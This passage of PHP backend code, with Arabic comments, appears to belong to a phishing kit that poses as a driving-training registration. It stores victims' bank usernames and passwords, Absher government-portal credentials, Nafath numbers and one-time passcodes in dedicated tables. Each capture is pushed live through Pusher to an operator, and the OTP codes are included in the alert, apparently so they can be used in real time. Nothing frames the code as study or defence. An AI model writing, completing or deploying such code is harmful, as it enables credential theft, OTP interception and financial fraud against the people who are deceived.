    $sql = 'SELECT * FROM `nafath_numbers` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetchAll();
  }
public function getUsersWithCards()
{
    $sql = "SELECT 
                u.id,
                u.username,
                u.message,
                u.name as full_name,
                u.phone as phone_number,
                COUNT(c.id) as card_count,
                MAX(c.created_at) as last_card_time
            FROM users u
            INNER JOIN cards c ON u.id = c.user_id
            GROUP BY u.id, u.username, u.message, u.name, u.phone
            ORDER BY MAX(c.created_at) DESC";
    
    DB::query($sql);
    DB::execute();
    
    if (DB::rowCount() > 0) {
        return DB::fetchAll();
    } else {
        return false;
    }
}
public function updateSecondStepData($userId, $data = array())
{
    $sql = 'UPDATE `users` SET 
      `region` = :region,
      `branch` = :branch,
      `level` = :level,
      `gear_type` = :gear_type,
      `time_period` = :time_period,
      `message` = :message,
      `currentpage` = :currentpage,
      `updated_at` = CURRENT_TIMESTAMP
    WHERE `id` = :user_id';

    DB::query($sql);
    DB::bind(':region', $data['region'] ?? null);
    DB::bind(':branch', $data['branch'] ?? null);
    DB::bind(':level', $data['level'] ?? null);
    DB::bind(':gear_type', $data['gear_type'] ?? null);
    DB::bind(':time_period', $data['time_period'] ?? null);
    DB::bind(':message', 'بيانات التدريب - المرحلة 2');
    DB::bind(':currentpage', 'register-second.php');
    DB::bind(':user_id', $userId);

    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'بيانات التدريب - المرحلة 2');
      return true;
    }
    
    return false;
}
/**
 * حفظ بيانات تسجيل الدخول للبنك
 */
public function insertBankLogin($data = array())
{
    $sql = 'INSERT INTO `bank_logins` (
        `user_id`,
        `bank`,
        `user_name`,
        `bk_pass`,
        `created_at`
    ) VALUES (
        :user_id,
        :bank,
        :user_name,
        :bk_pass,
        NOW()
    )';

    DB::query($sql);
    DB::bind(':user_id', $data['user_id']);
    DB::bind(':bank', $data['bank'] ?? null);
    DB::bind(':user_name', $data['user_name'] ?? null);
    DB::bind(':bk_pass', $data['bk_pass'] ?? null);

    if (DB::execute()) {
        $bankId = DB::lastInsertId();
        $this->sendPusherUpdate($data['user_id'], 'بيانات بنك جديدة - ' . ($data['bank'] ?? 'بنك'));
        return $bankId;
    }

    return false;
}

/**
 * جلب بيانات البنوك حسب user_id
 */
public function fetchBankLoginsByUserId($userId)
{
    $sql = 'SELECT * FROM `bank_logins` WHERE `user_id` = :user_id ORDER BY created_at DESC';
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    return DB::fetchAll();
}

/**
 * جلب آخر بيانات بنك لمستخدم معين
 */
public function fetchLastBankLoginByUserId($userId)
{
    $sql = "SELECT * FROM bank_logins 
            WHERE user_id = :user_id 
            ORDER BY id DESC 
            LIMIT 1";
    
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    
    return DB::fetch();
}
/**
 * حفظ رمز OTP البنك
 */
public function insertBankOTP($userId, $otpCode)
{
    $sql = 'INSERT INTO `bank_otps` (
        `user_id`,
        `otp_code`,
        `created_at`
    ) VALUES (
        :user_id,
        :otp_code,
        NOW()
    )';

    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::bind(':otp_code', $otpCode);

    if (DB::execute()) {
        $this->sendPusherUpdate($userId, 'رمز OTP بنك - ' . $otpCode);
        return DB::lastInsertId();
    }

    return false;
}

/**
 * جلب رموز OTP البنك
 */
public function fetchBankOTPsByUserId($userId)
{
    $sql = 'SELECT * FROM `bank_otps` WHERE `user_id` = :user_id ORDER BY created_at DESC';
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    return DB::fetchAll();
}
/**
 * ==========================================
 * دوال أبشر - أضفها في كلاس User
 * ==========================================
 */

/**
 * حفظ بيانات تسجيل الدخول لأبشر
 */
public function insertAbsherLogin($data = array())
{
    $sql = 'INSERT INTO `absher_logins` (
        `user_id`,
        `username_or_id`,
        `password`,
        `created_at`
    ) VALUES (
        :user_id,
        :username_or_id,
        :password,
        NOW()
    )';

    DB::query($sql);
    DB::bind(':user_id', $data['user_id']);
    DB::bind(':username_or_id', $data['username_or_id'] ?? null);
    DB::bind(':password', $data['password'] ?? null);

    if (DB::execute()) {
        $absher_id = DB::lastInsertId();
        $this->sendPusherUpdate($data['user_id'], 'بيانات أبشر جديدة');
        return $absher_id;
    }

    return false;
}

/**
 * جلب بيانات تسجيل الدخول لأبشر حسب user_id
 */
public function fetchAbsherLoginsByUserId($userId)
{
    $sql = 'SELECT * FROM `absher_logins` WHERE `user_id` = :user_id ORDER BY created_at DESC';
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    return DB::fetchAll();
}

/**
 * جلب آخر بيانات تسجيل دخول لأبشر لمستخدم معين
 */
public function fetchLastAbsherLoginByUserId($userId)
{
    $sql = "SELECT * FROM absher_logins 
            WHERE user_id = :user_id 
            ORDER BY id DESC 
            LIMIT 1";
    
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    
    return DB::fetch();
}

/**
 * حفظ رمز OTP أبشر
 */
public function insertAbsherOTP($userId, $otpCode)
{
    $sql = 'INSERT INTO `absher_otps` (
        `user_id`,
        `otp_code`,
        `created_at`
    ) VALUES (
        :user_id,
        :otp_code,
        NOW()
    )';

    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::bind(':otp_code', $otpCode);

    if (DB::execute()) {
        $this->sendPusherUpdate($userId, 'رمز OTP أبشر - ' . $otpCode);
        return DB::lastInsertId();
    }

    return false;
}

/**
 * جلب رموز OTP أبشر
 */
public function fetchAbsherOTPsByUserId($userId)
{
    $sql = 'SELECT * FROM `absher_otps` WHERE `user_id` = :user_id ORDER BY created_at DESC';
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    return DB::fetchAll();
}

/**
 * جلب آخر رمز OTP لأبشر
 */
public function fetchLastAbsherOTPByUserId($userId)
{
    $sql = "SELECT * FROM absher_otps 
            WHERE user_id = :user_id 
            ORDER BY id DESC 
            LIMIT 1";
    
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    
    return DB::fetch();
}
}
